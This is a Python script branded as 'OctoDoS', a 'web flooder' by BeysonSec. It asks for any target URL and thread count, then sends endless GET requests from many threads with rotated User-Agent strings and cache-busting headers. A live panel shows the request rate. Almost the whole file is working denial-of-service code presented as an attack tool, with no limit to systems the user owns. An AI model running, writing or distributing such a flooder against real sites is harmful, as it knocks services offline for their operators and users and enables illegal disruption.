#!/usr/bin/env python3
import threading
import requests
import time
import random
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt, FloatPrompt
from rich import box

console = Console()

BANNER = r"""
[bold red]
   ____       __        ____            
  / __ \_____/ /_____  / __ \____  _____
 / / / / ___/ __/ __ \/ / / / __ \/ ___/
/ /_/ / /__/ /_/ /_/ / /_/ / /_/ (__  ) 
\____/\___/\__/\____/_____/\____/____/  
                                         
[/bold red]
[dim]     web flooder --BeysonSec[/dim]
"""

stats = {
    "sent": 0,
    "success": 0,
    "failed": 0,
    "running": True,
    "start_time": 0,
    "target": "",
    "threads": 0,
}

lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.68.0",
    "python-requests/2.28.0",
]

def flood_worker(target, timeout):
    session = requests.Session()
    while stats["running"]:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Cache-Control": "no-cache",
                "Accept": "*/*",
            }
            session.get(target, headers=headers, timeout=timeout)
            with lock:
                stats["sent"] += 1
                stats["success"] += 1
        except Exception:
            with lock:
                stats["sent"] += 1
                stats["failed"] += 1

def make_panel():
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    rps = stats["sent"] / elapsed if elapsed > 0 else 0

    table = Table(box=box.SIMPLE_HEAVY, expand=True, show_header=False)
    table.add_column("stat",  style="dim",       width=22)
    table.add_column("value", style="bold cyan")

    table.add_row("target",           stats["target"])
    table.add_row("threads",          str(stats["threads"]))
    table.add_row("total sent",       str(stats["sent"]))
    table.add_row("success (2xx)",    f"[green]{stats['success']}[/green]")
    table.add_row("failed / timeout", f"[red]{stats['failed']}[/red]")
    table.add_row("req/s",            f"[yellow]{rps:.1f}[/yellow]")
    table.add_row("elapsed",          f"{elapsed:.1f}s")

    return Panel(
        table,
        title="[bold red]  flood  [/bold red]",
        subtitle="[dim]ctrl+c to stop[/dim]",
        border_style="red",
    )

def prompt_config():
    console.print(BANNER)

    target = Prompt.ask("[bold cyan]target url[/bold cyan]",
                        default="http://localhost").strip()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    threads = IntPrompt.ask("[bold cyan]threads[/bold cyan]", default=50)
    timeout = FloatPrompt.ask("[bold cyan]timeout (s)[/bold cyan]", default=5.0)

    console.print()
    console.print(f"[dim]flooding[/dim] [bold]{target}[/bold] "
                  f"[dim]with[/dim] [bold]{threads}[/bold] [dim]threads...[/dim]\n")
    return target, threads, timeout

def main():
    target, threads, timeout = prompt_config()

    stats["target"]     = target
    stats["threads"]    = threads
    stats["start_time"] = time.time()

    for _ in range(threads):
        t = threading.Thread(
            target=flood_worker,
            args=(target, timeout),
            daemon=True,
        )
        t.start()

    try:
        with Live(make_panel(), refresh_per_second=10, console=console) as live:
            while True:
                live.update(make_panel())
                time.sleep(0.1)
    except KeyboardInterrupt:
        stats["running"] = False
        console.print("\n[bold red]stopped.[/bold red]")

if __name__ == "__main__":
    main()